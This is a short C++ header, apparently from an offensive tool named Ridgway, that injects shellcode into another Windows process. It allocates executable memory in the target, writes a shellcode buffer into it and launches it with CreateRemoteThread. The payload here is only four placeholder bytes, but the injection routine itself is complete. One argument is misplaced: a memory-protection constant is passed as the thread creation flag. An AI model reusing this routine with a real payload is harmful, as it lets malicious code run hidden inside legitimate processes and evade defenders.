#pragma once
#include <Windows.h>
#include <psapi.h>
#include "Ridgway.h"

unsigned char shellcode[] =
{
  0x41, 0x41, 0x41, 0x41
};

BOOL InjectShellcodeIntoNewThread(PROCESS_INFORMATION processInfo)
{

	const PVOID memoryAddress = VirtualAllocEx(processInfo.hProcess, nullptr, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!memoryAddress)
	{
		DisplayErrorMessage(TEXT("Error calling VirtualAlloc"), GetLastError());
		return FALSE;
	}

	if (!WriteProcessMemory(processInfo.hProcess, memoryAddress, shellcode, sizeof(shellcode), nullptr))
	{
		DisplayErrorMessage(TEXT("Error writing process memory"), GetLastError());
		return FALSE;
	}

	if (!CreateRemoteThread(processInfo.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)memoryAddress, nullptr, PAGE_EXECUTE_READWRITE, nullptr))
	{
		DisplayErrorMessage(TEXT("Error creating thread"), GetLastError());
		return FALSE;
	}
	return TRUE;
}